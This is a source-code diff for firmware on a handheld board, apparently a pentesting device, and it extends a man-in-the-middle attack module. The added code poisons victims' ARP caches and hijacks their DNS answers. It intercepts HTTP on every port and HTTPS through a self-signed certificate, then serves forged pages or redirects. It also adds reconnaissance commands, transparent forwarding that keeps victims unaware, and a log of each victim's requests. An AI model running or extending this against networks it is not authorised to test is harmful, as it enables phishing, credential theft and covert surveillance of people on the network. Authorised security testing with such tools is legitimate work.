@@ -252,7 +252,8 @@ static const char MITM_DNS_EXAMPLE[] =
 static const char MITM_REDIRECT_EXAMPLE[] =
     "# Vandeta HTML Intercept redirects\n"
     "# one rule per line: <pattern> <url>\n"
-    "#   * = every plain-HTTP request, otherwise a host or host substring\n"
+    "#   * = every web request (HTTP on any port, and HTTPS), otherwise a host\n"
+    "#       or host substring\n"
     "* http://192.168.4.1/\n";
 
 static const char MITM_HTML_EXAMPLE[] =
@@ -269,12 +270,16 @@ static const char MITM_SCRIPT_EXAMPLE[] =
     "# Vandeta MITM payload\n"
     "# one command per line, # = comment\n"
     "#\n"
-    "#   page <match> <file>            200 + HTML for matching HTTP requests\n"
-    "#   redirect <match> <url>         302 for matching HTTP requests\n"
+    "#   page <match> <file>            200 + HTML for matching web requests\n"
+    "#   redirect <match> <url>         302 for matching web requests\n"
     "#   dns <name|*> <ip>              answer DNS queries\n"
     "#   target all|<ip>                override the page's Target mode\n"
-    "#   fallback dns <ip> [secs]       if no HTTP request landed in <secs>\n"
+    "#   fallback dns <ip> [secs]       if no web request landed in <secs>\n"
     "#   fallback redirect <url> [secs] ... the same, with a 302 instead\n"
+    "#   (chain up to 3 fallbacks; each <secs> counts from the start)\n"
+    "#   info                           log the network the board is on\n"
+    "#   probe all|<ip>                 ARP-resolve the target(s) and log them\n"
+    "#   (info/probe are read-only and run before any request is answered)\n"
     "#\n"
     "# <match> is a host substring, or * for every request.\n"
     "# <file> is relative to /BruceSpoof and must fit 1100 bytes.\n"
@@ -286,10 +291,12 @@ static const char MITM_SCRIPT_EXAMPLE[] =
     "# `gateway` / `this` are accepted instead of a hard-coded address.\n"
     "dns * gateway\n"
     "\n"
-    "# Plain HTTP only: HTTPS never reaches this board. If nothing lands, try a\n"
-    "# second method instead of the page.\n"
+    "# Plain HTTP is answered on every TCP port. HTTPS is served by the board's\n"
+    "# self-signed TLS endpoint, so the browser shows its certificate warning\n"
+    "# once; after continuing, the same page/redirect applies. While HTTPS is\n"
+    "# up, every DNS A answer points at the board.\n"
     "#fallback dns gateway 10\n"
-    "#fallback redirect http://192.168.1.1/ 10\n";
+    "#fallback redirect http://192.168.1.1/ 25\n";
 
 bool mitmPayloadWriteExample(const String &path, bool overwrite, String *error) {
     FS *fs = mitmFs();
@@ -427,8 +434,9 @@ static String mitmNoteLabel(const String &note) {
  */
 static void mitmTeardown() {
     String err;
-    if (netspoof_dns_active()) netspoof_dns_stop(err);
+    if (netspoof_https_active()) netspoof_https_stop(err);
     if (netspoof_http_active()) netspoof_http_stop(err);
+    if (netspoof_dns_active()) netspoof_dns_stop(err);
     if (netspoof_arp_active()) netspoof_arp_stop(err);
 }
 
@@ -446,6 +454,11 @@ static void mitmTeardown() {
 //   target all|<ip>                  arpSpoof.start() for each host
 //   fallback dns <ip> [secs]         ... when no HTTP request landed
 //   fallback redirect <url> [secs]   ... the same, with a 302 instead
+//   info                             log SSID/channel/board IP/gateway MAC
+//   probe all|<ip>                   ARP-resolve the targets and log them
+//
+// `info` and `probe` only read: they never poison a host or change a rule, so a
+// payload can describe the network it landed on and still run the same attack.
 //
 // A `.html` payload is shorthand for `page * <that file>`.
 
@@ -597,33 +610,68 @@ MitmScriptResult mitmPayloadLoadScript(const String &path) {
             IPAddress parsed;
             if (who == "all" || parsed.fromString(who.c_str())) res.target = who;
             else res.bad++;
+        } else if (cmd == "forward") {
+            String mode = mitmNextToken(line, cur);
+            mode.toLowerCase();
+            if (mode == "on" || mode == "yes" || mode == "1") res.forward = 2;
+            else if (mode == "auto") res.forward = 1;
+            else if (mode == "off" || mode == "no" || mode == "0") res.forward = 0;
+            else res.bad++;
+        } else if (cmd == "offline") {
+            String what = mitmNextToken(line, cur);
+            String file = mitmNextToken(line, cur);
+            what.toLowerCase();
+            if (what == "page" && file.length()) res.offlinePage = mitmResolveScriptPath(file);
+            else res.bad++;
+        } else if (cmd == "info") {
+            // Reconnaissance only: no arguments, nothing armed.
+            res.wantInfo = true;
+        } else if (cmd == "probe" || cmd == "lookup") {
+            String who = mitmNextToken(line, cur);
+            who.toLowerCase();
+            IPAddress parsed;
+            if (who != "all" && !parsed.fromString(who.c_str())) {
+                res.bad++;
+            } else if (res.probeCount < MITM_PROBE_MAX) {
+                res.probes[res.probeCount++] = who;
+            } else {
+                // More than MITM_PROBE_MAX lines is a payload mistake, not a
+                // rule failure; count it so `mitm payload` says so.
+                res.bad++;
+            }
         } else if (cmd == "fallback") {
             String kind = mitmNextToken(line, cur);
             String value = mitmNextToken(line, cur);
             String secs = mitmNextToken(line, cur);
             kind.toLowerCase();
-            if (kind == "dns") {
-                String ip;
-                bool okIp = mitmResolveSpecIp(value, ip);
-                if (!okIp && value.length() == 0) {
-                    res.bad++;
-                } else {
-                    res.fallbackSet = true;
-                    res.fallbackDns = true;
-                    res.fallbackValue = okIp ? ip : value;
-                    res.fallbackAfterMs = mitmParseSeconds(secs, MITM_FALLBACK_DEFAULT_MS);
-                }
-            } else if (kind == "redirect" || kind == "302") {
-                if (value.length() == 0) {
-                    res.bad++;
-                } else {
-                    res.fallbackSet = true;
-                    res.fallbackDns = false;
-                    res.fallbackValue = value;
-                    res.fallbackAfterMs = mitmParseSeconds(secs, MITM_FALLBACK_DEFAULT_MS);
-                }
-            } else {
+            bool isDns = (kind == "dns");
+            bool isRedirect = (kind == "redirect" || kind == "302");
+            if (!isDns && !isRedirect) {
                 res.bad++;
+            } else if (value.length() == 0) {
+                res.bad++;
+            } else {
+                String stored = value;
+                if (isDns) {
+                    String ip;
+                    // An unresolvable token is kept verbatim and resolved per
+                    // query, exactly like a `dns` rule (`gateway` while the
+                    // station is still associating).
+                    if (mitmResolveSpecIp(value, ip)) stored = ip;
+                }
+                uint32_t after = mitmParseSeconds(secs, MITM_FALLBACK_DEFAULT_MS);
+                res.fallbackSet = true;
+                res.fallbackDns = isDns;
+                res.fallbackValue = stored;
+                res.fallbackAfterMs = after;
+                // Chain: a payload can list several fallbacks and they are
+                // tried in file order, each at its own time from the start.
+                if (res.fallbackCount < MITM_FALLBACK_MAX) {
+                    MitmFallbackStep &step = res.fallbacks[res.fallbackCount++];
+                    step.dns = isDns;
+                    step.value = stored;
+                    step.afterMs = after;
+                }
             }
         } else {
             res.bad++;
@@ -824,13 +872,20 @@ static const char *mitmAuthName(wifi_auth_mode_t mode) {
 // the old script printed numbers and a failed run looked exactly like one that
 // was never reached. Every line is also mirrored to Serial, so the same feed is
 // readable over USB (`usbdebug` console) while testing.
-#define MITM_LOG_LINES 5
+#define MITM_LOG_LINES 10
 static String mitmLogLine[MITM_LOG_LINES];
 static int mitmLogUsed = 0;
+static uint32_t mitmRunStart = 0;
 
 static void mitmLogAdd(const String &text) {
     String line = text;
     if (line.length() > 60) line = line.substring(0, 60);
+    // A terminal-style timestamp: the feed is there to explain what happened
+    // and when, which is the one thing a counter table could never do.
+    char stamp[12];
+    unsigned long secs = mitmRunStart ? (millis() - mitmRunStart) / 1000UL : 0;
+    snprintf(stamp, sizeof(stamp), "+%lus ", secs);
+    line = String(stamp) + line;
     for (int i = 0; i < MITM_LOG_LINES - 1; i++) mitmLogLine[i] = mitmLogLine[i + 1];
     mitmLogLine[MITM_LOG_LINES - 1] = line;
     if (mitmLogUsed < MITM_LOG_LINES) mitmLogUsed++;
@@ -843,49 +898,130 @@ static void mitmLogClear() {
 }
 
 /// Copy the new captures (oldest first) into the activity log.
-static void mitmLogCaptures(uint32_t &lastTs) {
-    int n = netspoof_capture_count();
-    int start = n - 1;
-    for (; start >= 0; start--) {
-        const NetSpoofCapture *c = netspoof_capture(start);
-        if (!c || c->ts <= lastTs) break;
-    }
-    for (int i = start + 1; i < n; i++) {
+///
+/// The ring keeps the newest entries at index 0, so new work is found through
+/// the monotonic capture counter rather than timestamps: DNS and HTTP captures
+/// routinely share a millisecond, and a "ts > last" scan silently dropped the
+/// second one. @p lastTotal is updated even when the ring wrapped, so a burst
+/// larger than the ring can never re-log old lines.
+static void mitmLogCaptures(uint32_t &lastTotal) {
+    uint32_t total = netspoof_capture_total();
+    if (total == lastTotal) return;
+    uint32_t fresh = total - lastTotal;
+    if (fresh > (uint32_t)NETSPOOF_MAX_CAPTURES) fresh = NETSPOOF_MAX_CAPTURES;
+    lastTotal = total;
+    for (int i = (int)fresh - 1; i >= 0; i--) {
         const NetSpoofCapture *c = netspoof_capture(i);
         if (!c) continue;
-        if (c->ts > lastTs) lastTs = c->ts;
-        if (c->kind == 0) {
-            if (c->action == 1) mitmLogAdd(String("DNS ") + c->host + " -> us");
-            else mitmLogAdd(String("DNS query ") + c->host);
+        // A capture whose peer address could not be read (the TLS server's
+        // socket, occasionally) still has a host name worth logging.
+        String who = c->clientIp ? c->clientIp.toString() : String("client");
+        if (c->kind == NETSPOOF_CAPTURE_DNS) {
+            if (c->action == 1) mitmLogAdd(who + " dns " + c->host + " -> " + c->path);
+            else mitmLogAdd(who + " dns query " + c->host);
             continue;
         }
-        String what = String(c->method) + " " + c->host;
-        if (c->path[0] && String(c->path) != "/") what += c->path;
-        if (c->action == 1) what = "302 " + what;
-        else if (c->action == 2) what = "page " + what;
-        else what = "seen " + what;
-        if (c->clientIp) what += " <- " + c->clientIp.toString();
-        mitmLogAdd(what);
+        if (c->action == 1) {
+            mitmLogAdd(who + " redirected " + c->host);
+        } else if (c->action == 2) {
+            mitmLogAdd(who + " got page " + c->host);
+        } else if (c->action == 0) {
+            mitmLogAdd(who + " " + String(c->method) + " " + c->host + " (no rule)");
+        } else {
+            mitmLogAdd(who + " " + String(c->method) + " " + c->host);
+        }
     }
 }
 
-/// Arm the fallback the payload asked for, once, when nothing landed in time.
-static void mitmApplyFallback(const MitmScriptResult &r, String &state) {
+/// "aa:bb:cc:dd:ee:ff" for a 6-byte MAC (the panel font is ASCII only).
+static String mitmMacLabel(const uint8_t *mac) {
+    char buf[18];
+    snprintf(
+        buf, sizeof(buf), "%02x:%02x:%02x:%02x:%02x:%02x", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]
+    );
+    return String(buf);
+}
+
+/**
+ * @brief Run the payload's reconnaissance lines and log the result.
+ *
+ * `info` reports the link the attack is running on (SSID, channel, board IP and
+ * the gateway with its MAC) and `probe` resolves hosts through ARP, so a
+ * payload can say what it is actually facing - a router, a phone, a printer -
+ * instead of assuming. Read-only: no ARP pair starts and no rule changes, so
+ * this cannot interfere with the lines that follow it.
+ *
+ * Runs after the pairs are up so a `probe all` can read the list the pairing
+ * scan already built; a single-target run scans only when the list is empty.
+ */
+static void mitmRunRecon(const MitmScriptResult &r) {
+    if (r.wantInfo) {
+        bool linked = WiFi.isConnected();
+        mitmLogAdd(
+            String("info ") + (linked ? WiFi.SSID() : String("no network")) + " ch" +
+            String(linked ? WiFi.channel() : 0) + " ip " + (linked ? WiFi.localIP().toString() : String("-"))
+        );
+        IPAddress gw;
+        uint8_t gwMac[6];
+        if (netspoof_gateway_info(gw, gwMac)) {
+            mitmLogAdd(String("info gateway ") + gw.toString() + " " + mitmMacLabel(gwMac));
+        } else {
+            mitmLogAdd("info gateway unknown (ARP table empty)");
+        }
+    }
+
+    for (int i = 0; i < r.probeCount; i++) {
+        String spec = r.probes[i];
+        if (spec.equalsIgnoreCase("all")) {
+            String err;
+            if (netspoof_target_count() == 0) netspoof_scan_targets(MITM_PROBE_SCAN_MS, err);
+            int n = netspoof_target_count();
+            if (n == 0) {
+                mitmLogAdd("probe all: no host answered ARP");
+                continue;
+            }
+            for (int k = 0; k < n && k < MITM_PROBE_LINES; k++) {
+                const NetSpoofTarget *t = netspoof_target(k);
+                if (!t) continue;
+                mitmLogAdd(String("probe ") + t->ip.toString() + " " + t->macStr + (t->gateway ? " gw" : ""));
+            }
+            if (n > MITM_PROBE_LINES) mitmLogAdd(String("probe all: ") + String(n) + " host(s) total");
+            continue;
+        }
+        IPAddress ip;
+        if (!ip.fromString(spec.c_str())) {
+            mitmLogAdd("probe " + spec + " bad address");
+            continue;
+        }
+        uint8_t mac[6];
+        if (netspoof_resolve_mac(ip, mac, 1500)) mitmLogAdd(String("probe ") + ip.toString() + " " + mitmMacLabel(mac));
+        else mitmLogAdd(String("probe ") + ip.toString() + " no answer");
+    }
+}
+
+/// Arm one fallback step after the previous methods produced nothing.
+static void mitmApplyFallback(const MitmFallbackStep &step, String &state) {
     String err;
-    if (r.fallbackDns) {
+    if (step.dns) {
         // The page never fired: answer the victim's lookups instead, so its next
         // request is pointed at a name we control.
-        if (netspoof_dns_add_rule("*", r.fallbackValue, true, err) && netspoof_dns_start(err)) {
-            state = String("dns ") + r.fallbackValue;
-            mitmLogAdd(String("no HTTP hit - answering DNS with ") + r.fallbackValue);
+        if (netspoof_dns_add_rule("*", step.value, true, err) && netspoof_dns_start(err)) {
+            state = String("dns ") + step.value;
+            // While HTTPS is up, A records are pinned to the board, so a DNS
+            // fallback can no longer move the victim elsewhere. Say so rather
+            // than pretending the rule took effect.
+            mitmLogAdd(
+                String("no hit yet - answering DNS with ") + step.value +
+                (netspoof_https_active() ? String(" (HTTPS stays on board)") : String())
+            );
         } else {
             state = "failed";
             mitmLogAdd(String("fallback dns failed: ") + (err.length() ? err : String("engine")));
         }
     } else {
-        if (netspoof_http_add_redirect("*", r.fallbackValue, true, err) && netspoof_http_start(err)) {
-            state = String("302 ") + r.fallbackValue;
-            mitmLogAdd(String("no page hit - 302 everything to ") + r.fallbackValue);
+        if (netspoof_http_add_redirect("*", step.value, true, err) && netspoof_http_start(err)) {
+            state = String("302 ") + step.value;
+            mitmLogAdd(String("no hit yet - 302 everything to ") + step.value);
         } else {
             state = "failed";
             mitmLogAdd(String("fallback 302 failed: ") + (err.length() ? err : String("engine")));
@@ -893,53 +1029,70 @@ static void mitmApplyFallback(const MitmScriptResult &r, String &state) {
     }
 }
 
-/// The live run screen: link state and counters on top, activity feed below.
+/// The live run screen: one opaque box in the middle of the panel holding the
+/// whole status feed.
 ///
-/// The counters used to start at y=30, which is where printTitle() draws the
-/// "MITM RUN" title (BORDER_PAD_Y = 28, FM text ~16 px tall) - so the status
-/// text was painted straight over the title. The first line now starts below the
-/// title, and the fallback state rides on the link line so the feed keeps its
-/// rows on a 170 px panel.
-static void mitmDrawRun(int pairs, const String &fallbackState) {
+/// The feed used to be drawn straight onto the screen between two header rows,
+/// so its lines ran across whatever the menu underneath had left there and the
+/// panel read as text scattered over the GUI. Now a cleared, bordered box owns
+/// the middle of the screen: the link line is its header, the log is its body,
+/// and the one hint sits in the strip below it. Nothing is painted outside the
+/// box except the title, so no GUI element can ever show through the log.
+///
+/// The body uses the small font (FP): 49 characters per line and 8 px rows fit
+/// the ten buffered lines exactly, which is what a terminal tail should look
+/// like on a 320x170 panel.
+static void mitmDrawRun(int pairs, const String &fallbackState, uint32_t hits) {
     drawMainBorderWithTitle("MITM RUN");
     tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
-    const int step = LH * FM + 2;
-    int y = BORDER_PAD_Y + FM * LH + 4;
 
+    const int boxX = 6;
+    const int boxW = tftWidth - 12;
+    const int boxY = BORDER_PAD_Y + FM * LH + 4;  // just under the title
+    const int boxH = tftHeight - boxY - 16;       // strip left for the hint
+
+    // Opaque first: this is what hides the menu the attack was started from.
+    tft.fillRoundRect(boxX, boxY, boxW, boxH, 4, bruceConfig.bgColor);
+    tft.drawRoundRect(boxX, boxY, boxW, boxH, 4, bruceConfig.priColor);
+
+    // Header: network, target, pairs and hits on one line at normal size.
     String ssid = WiFi.isConnected() ? WiFi.SSID() : String("no network");
-    if (ssid.length() > 18) ssid = ssid.substring(0, 18);
-    String link = ssid + " " + mitmAuthName(WiFi.isConnected() ? mitmCurrentAuth() : WIFI_AUTH_OPEN);
-    if (fallbackState.length() && !fallbackState.equals("none")) {
-        String f = "  next:" + fallbackState;
-        if (f.length() > 16) f = f.substring(0, 16);
-        link += f;
-    }
-    if (link.length() > 38) link = link.substring(0, 38);
-    tft.drawString(link, 8, y);
-    y += step;
-
+    if (ssid.length() > 11) ssid = ssid.substring(0, 11);
     String tgt = mitmTargetLabel();
-    if (tgt.length() > 14) tgt = tgt.substring(0, 14);
-    tft.drawString(
-        String("pairs ") + String(pairs) + "  http " + String(netspoof_http_injected()) + "/" +
-            String(netspoof_http_requests()) + "  dns " + String(netspoof_dns_answers()),
-        8, y
-    );
-    y += step;
+    if (tgt.length() > 10) tgt = tgt.substring(0, 10);
+    String head = ssid + " " + tgt + " p" + String(pairs) + " h" + String(hits);
+    if (head.length() > 24) head = head.substring(0, 24);
+    tft.setTextSize(FM);
+    tft.drawString(head, boxX + 6, boxY + 4);
 
-    tft.drawLine(6, y - 2, tftWidth - 8, y - 2, bruceConfig.priColor);
+    tft.drawLine(boxX + 4, boxY + 21, boxX + boxW - 5, boxY + 21, bruceConfig.priColor);
 
-    // Activity feed, oldest at the top. The newest line is what the attack is
-    // doing at this instant ("page GET captive.apple.com <- 192.168.1.167").
-    for (int i = 0; i < MITM_LOG_LINES; i++) {
-        if (y + step > tftHeight - 18) break;
-        String line = mitmLogLine[i];
-        if (line.length() > 38) line = line.substring(0, 38);
-        tft.drawString(line, 8, y);
-        y += step;
+    // Terminal-style feed: the newest event sits on the bottom line, the way a
+    // tail of a log file reads. The old counter table said "http 0/0", which
+    // looked identical whether nobody visited or the attack was broken; these
+    // lines say who did what.
+    const int lineH = FP * LH;
+    const int firstY = boxY + 24;
+    int rows = (boxY + boxH - 4 - firstY) / lineH;
+    if (rows > mitmLogUsed) rows = mitmLogUsed;
+    if (rows > MITM_LOG_LINES) rows = MITM_LOG_LINES;
+    if (rows > 0) {
+        int first = MITM_LOG_LINES - rows;
+        int y = boxY + boxH - 4 - rows * lineH; // bottom-aligned: tail of a log
+        tft.setTextSize(FP);
+        for (int i = 0; i < rows; i++) {
+            String line = mitmLogLine[first + i];
+            if (line.length() > 49) line = line.substring(0, 49);
+            tft.drawString(line, boxX + 4, y);
+            y += lineH;
+        }
     }
 
-    tft.drawString("BACK = stop + restore ARP", 8, tftHeight - 16);
+    // The one hint, in the strip under the box so it never eats a log row.
+    String hint = "next:" + (fallbackState.length() ? fallbackState : String("none")) + "  BACK=stop";
+    if (hint.length() > 49) hint = hint.substring(0, 49);
+    tft.setTextSize(FP);
+    tft.drawString(hint, boxX + 2, tftHeight - 14);
 }
 
 /**
@@ -958,6 +1111,7 @@ static String mitmRunCore(const String &path, uint32_t durationMs, bool draw) {
 
     String err;
     mitmLogClear();
+    mitmRunStart = millis();
     if (draw) {
         drawMainBorderWithTitle("MITM RUN");
         tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
@@ -967,10 +1121,10 @@ static String mitmRunCore(const String &path, uint32_t durationMs, bool draw) {
     // Say what the board is working with before touching anyone: the network it
     // joined and what it can do on it.
     wifi_auth_mode_t auth = WiFi.isConnected() ? mitmCurrentAuth() : WIFI_AUTH_OPEN;
-    mitmLogAdd(String(WiFi.isConnected() ? WiFi.SSID() : String("no network")) + " " + mitmAuthName(auth));
-    if (WiFi.isConnected() && auth != WIFI_AUTH_OPEN) {
-        mitmLogAdd(String(mitmAuthName(auth)) + " detected - plain HTTP only, HTTPS is not forgeable");
-    }
+    mitmLogAdd(
+        String("attack started against ") + (WiFi.isConnected() ? WiFi.SSID() : String("no network"))
+    );
+    mitmLogAdd(String(mitmAuthName(auth)) + " - HTTP all ports + HTTPS (cert warning)");
     mitmLogAdd(
         String("payload: ") + String(r.pages) + " page " + String(r.redirects) + " redir " + String(r.dns) + " dns"
     );
@@ -986,60 +1140,114 @@ static String mitmRunCore(const String &path, uint32_t durationMs, bool draw) {
     }
     if (pairs > netspoof_arp_pair_count()) mitmLogAdd(String("poisoning ") + String(pairs) + " device(s)");
 
+    // Reconnaissance lines (`info`, `probe`) come after the pairs so `probe all`
+    // can reuse the scan that just ran, and before the engines so the feed shows
+    // what the run is facing before the first request is answered.
+    mitmRunRecon(r);
+
+    // Transparent forwarding: the payload asks for the bridge and declares what
+    // to serve if the board cannot provide it. This is the capability check the
+    // `.mitm` format allows - `forward auto` + `offline page` means "redirect to
+    // the real target when the victim keeps internet, otherwise the offline
+    // page", decided at start from what the engine can actually do.
+    bool forwarding = false;
+    if (r.forward != 0) {
+        String ferr;
+        forwarding = netspoof_forward_start(ferr);
+        if (forwarding) {
+            mitmLogAdd("forwarding on - targets keep internet");
+        } else {
+            mitmLogAdd(String("forwarding failed: ") + (ferr.length() ? ferr : String("no gateway")));
+            if (r.offlinePage.length()) {
+                // No internet path exists without the bridge, so a redirect to a
+                // real host could never load: serve the page locally instead.
+                netspoof_http_clear_redirects();
+                MitmPayloadResult html = mitmPayloadLoadHtml(r.offlinePage, "*");
+                if (html.ok) mitmLogAdd(String("offline page: ") + r.offlinePage);
+                else mitmLogAdd("offline page failed: " + html.error);
+            }
+        }
+    }
+
     if (r.dns > 0 && !netspoof_dns_start(err)) mitmLogAdd(String("dns engine failed: ") + err);
     if ((r.pages + r.redirects) > 0 && !netspoof_http_start(err)) mitmLogAdd(String("http engine failed: ") + err);
     if (!netspoof_dns_active() && !netspoof_http_active()) {
         String why = err.length() ? err : String("engine did not start");
         String ignored;
+        if (netspoof_forward_active()) netspoof_forward_stop();
         netspoof_arp_stop(ignored);
         return "err: " + why;
     }
-    if (netspoof_http_active()) mitmLogAdd(r.redirects ? "waiting for HTTP requests (302)" : "waiting for HTTP requests (page)");
+    if (netspoof_https_active()) {
+        mitmLogAdd("https :443 up (self-signed, warning expected)");
+    }
+    if (netspoof_http_active())
+        mitmLogAdd(r.redirects ? "waiting for HTTP/HTTPS requests (302)" : "waiting for HTTP/HTTPS requests (page)");
     else mitmLogAdd("waiting for DNS queries");
 
     uint32_t started = millis();
     uint32_t lastDraw = 0, lastPrint = 0;
-    uint32_t lastCaptureTs = started;
-    bool fallbackArmed = r.fallbackSet;
-    String fallbackState = r.fallbackSet ? (r.fallbackDns ? "waiting (dns)" : "waiting (302)") : "none";
+    netspoof_capture_clear();
+    uint32_t lastCaptureTotal = netspoof_capture_total();
+    int fallbackNext = 0;
+    String fallbackState = r.fallbackCount > 0 ? String("armed") : String("none");
 
     while (true) {
         if (durationMs == 0 && check(EscPress)) break;
         if (durationMs > 0 && (millis() - started) >= durationMs) break;
 
         uint32_t now = millis();
-        uint32_t hits = netspoof_http_injected() + netspoof_http_redirected();
+        uint32_t hits = netspoof_http_injected() + netspoof_http_redirected() + netspoof_https_injected() +
+                        netspoof_https_redirected();
 
-        if (fallbackArmed && hits == 0 && (now - started) >= r.fallbackAfterMs) {
-            fallbackArmed = false;
-            mitmApplyFallback(r, fallbackState);
+        // Fallbacks are a timetable: each line fires at its own time from the
+        // start, and only while the attack has not produced a single hit, so a
+        // fallback can never override a rule that is already working. Several
+        // steps whose deadline already passed fire in the same pass.
+        while (fallbackNext < r.fallbackCount && hits == 0 &&
+               (now - started) >= r.fallbacks[fallbackNext].afterMs) {
+            mitmApplyFallback(r.fallbacks[fallbackNext], fallbackState);
+            fallbackNext++;
         }
-        if (!fallbackArmed && fallbackState.startsWith("waiting")) fallbackState = "spent";
+        if (fallbackNext >= r.fallbackCount && fallbackState == "armed") fallbackState = "spent";
 
-        // Feed every new capture into the activity log: the ring keeps 8
-        // entries and DNS traffic pushes HTTP out between two polls, so a
-        // missed capture is gone for good.
-        mitmLogCaptures(lastCaptureTs);
+        // Feed every new capture into the activity log. The ring is small and
+        // DNS traffic can push HTTP out between two polls, so the log is drained
+        // every pass and never reconstructs state from timestamps.
+        mitmLogCaptures(lastCaptureTotal);
 
         if (now - lastPrint >= 5000) {
             lastPrint = now;
             Serial.printf(
-                "[MITM] t+%lus pairs=%d frames=%lu dns=%lu/%lu http=%lu/%lu fallback=%s\n",
+                "[MITM] t+%lus pairs=%d frames=%lu dns=%lu/%lu http=%lu/%lu https=%lu/%lu fallback=%s\n",
                 (unsigned long)((now - started) / 1000), netspoof_arp_pair_count(), (unsigned long)netspoof_arp_frames(),
                 (unsigned long)netspoof_dns_answers(), (unsigned long)netspoof_dns_queries(),
-                (unsigned long)netspoof_http_injected(), (unsigned long)netspoof_http_requests(), fallbackState.c_str()
+                (unsigned long)netspoof_http_injected(), (unsigned long)netspoof_http_requests(),
+                (unsigned long)netspoof_https_injected(), (unsigned long)netspoof_https_requests(), fallbackState.c_str()
             );
         }
         if (draw && now - lastDraw >= 250) {
             lastDraw = now;
-            mitmDrawRun(netspoof_arp_pair_count(), fallbackState);
+            mitmDrawRun(netspoof_arp_pair_count(), fallbackState, hits);
         }
         vTaskDelay(pdMS_TO_TICKS(25));
     }
 
+    mitmLogCaptures(lastCaptureTotal);
+    mitmLogAdd(
+        String("stopping - ") +
+        String(
+            netspoof_http_injected() + netspoof_http_redirected() + netspoof_https_injected() +
+            netspoof_https_redirected()
+        ) +
+        " hit(s), restoring ARP"
+    );
+
     // Stop the responders first, restore ARP last: the victim keeps sending its
     // gateway traffic here until the two mappings are put back.
-    String e1, e2, e3;
+    String e0, e1, e2, e3;
+    if (forwarding || netspoof_forward_active()) netspoof_forward_stop();
+    if (netspoof_https_active()) netspoof_https_stop(e0);
     if (netspoof_http_active()) netspoof_http_stop(e1);
     if (netspoof_dns_active()) netspoof_dns_stop(e2);
     if (netspoof_arp_active()) netspoof_arp_stop(e3);
@@ -1047,12 +1255,15 @@ static String mitmRunCore(const String &path, uint32_t durationMs, bool draw) {
     mitmClearKeys();
     String summary = String("pairs ") + String(pairs) + " dns " + String(netspoof_dns_answers()) + "/" +
                      String(netspoof_dns_queries()) + " http " + String(netspoof_http_injected()) + "/" +
-                     String(netspoof_http_requests());
+                     String(netspoof_http_requests()) + " https " + String(netspoof_https_injected()) + "/" +
+                     String(netspoof_https_requests());
     Serial.printf(
-        "[MITM] stop pairs=%d requests=%lu redirected=%lu injected=%lu dnsQ=%lu dnsA=%lu\n", netspoof_arp_pair_count(),
+        "[MITM] stop pairs=%d requests=%lu redirected=%lu injected=%lu https=%lu/%lu/%lu dnsQ=%lu dnsA=%lu\n",
+        netspoof_arp_pair_count(),
         (unsigned long)netspoof_http_requests(), (unsigned long)netspoof_http_redirected(),
-        (unsigned long)netspoof_http_injected(), (unsigned long)netspoof_dns_queries(),
-        (unsigned long)netspoof_dns_answers()
+        (unsigned long)netspoof_http_injected(), (unsigned long)netspoof_https_requests(),
+        (unsigned long)netspoof_https_redirected(), (unsigned long)netspoof_https_injected(),
+        (unsigned long)netspoof_dns_queries(), (unsigned long)netspoof_dns_answers()
     );
     return summary;
 }
@@ -1107,10 +1318,12 @@ static void mitmShowCaptures() {
     for (int i = 0; i < n && shown < 40; i++) {
         const NetSpoofCapture *c = netspoof_capture(i);
         if (!c) continue;
-        String line = c->kind == 0 ? String("dns ") : String(c->method) + " ";
+        String line = c->kind == NETSPOOF_CAPTURE_DNS
+                           ? String("dns ")
+                           : String(c->kind == NETSPOOF_CAPTURE_HTTPS ? "https " : "") + String(c->method) + " ";
         line += String(c->host);
         if (c->path[0]) line += String(c->path);
-        if (c->kind == 0) line += c->action == 1 ? "  answered" : "  seen";
+        if (c->kind == NETSPOOF_CAPTURE_DNS) line += c->action == 1 ? "  answered" : "  seen";
         else if (c->action == 1) line += "  redirected";
         else if (c->action == 2) line += "  injected";
         else line += "  seen";
@@ -1180,9 +1393,10 @@ AGAIN:
     options.push_back({String("Payload: ") + (mitmScriptPath.length() ? mitmShortPath(mitmScriptPath) : String("none")),
                        []() { mitmPickPayload(); }});
     options.push_back({"Preview payload", []() { mitmPreviewPayload(); }});
-    if (netspoof_dns_active() || netspoof_http_active() || netspoof_arp_active()) {
+    if (netspoof_dns_active() || netspoof_http_active() || netspoof_https_active() || netspoof_arp_active()) {
         options.push_back({"Stop + restore", []() {
                                String err;
+                               if (netspoof_https_active()) netspoof_https_stop(err);
                                if (netspoof_http_active()) netspoof_http_stop(err);
                                if (netspoof_dns_active()) netspoof_dns_stop(err);
                                if (netspoof_arp_active()) netspoof_arp_stop(err);
